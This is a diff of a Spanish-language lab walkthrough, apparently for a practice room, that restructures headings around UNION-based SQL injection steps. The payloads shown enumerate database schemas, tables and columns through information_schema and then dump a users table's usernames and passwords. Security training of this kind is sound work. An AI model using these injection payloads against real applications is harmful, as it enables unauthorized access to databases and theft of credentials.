@@ -5,24 +5,25 @@ Como sabemos que la base de datos no es oracle y que la vulnerabilidad esta en l
 
 Al hacerlo, podremos descubrir que la tabla, tiene dos columnas, luego, con el siguinte comando:  
 
-' UNION SELECT schema_name,NULL FROM information_schema.schemata-- -
+## Listar nombres de las bases de datos
 
-Podremos ver las bases de datos, para analizarlas y no tocar bases de datos por defecto de la DBMS.  
+' UNION SELECT schema_name,NULL FROM information_schema.schemata-- -
+ 
 Al hacerlo, podremos ver la base de datos "public", la cual nos interesa para este room.
 
-Con el siguiente inyeccion, podremos ver las tablas en la base de datos "public"
+## Mostrar las tablas en la base de datos "public"
 
 ' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema = 'public'-- -
 
 Donde podremos ver las tablas products y users_xktbui, la cual esta ultima es la que nos interesa.
 
-Para acceder a la informacion de la misma, podremos hacer uso de la siguiente inyeccion:
+## Mostrar las columnas de la tabla users
 
 ' UNION SELECT COLUMN_NAME,NULL FROM information_schema.columns WHERE table_name = 'users_xktbui'-- -
 
 Al hacerlo, veremos dos columnas que componen a la tabla users, una sera de usuarios y otras de contraseñas:password_ywzksf y username_kifewi.
 
-para acceder a la informaciion de las columnas, haremos uso de la siguiente inyeccion: 
+## para acceder a la informaciion de las columnas, haremos uso de la siguiente inyeccion: 
 
 ' UNION SELECT username_kifewi,password_ywzksf FROM users_xktbui-- -
 
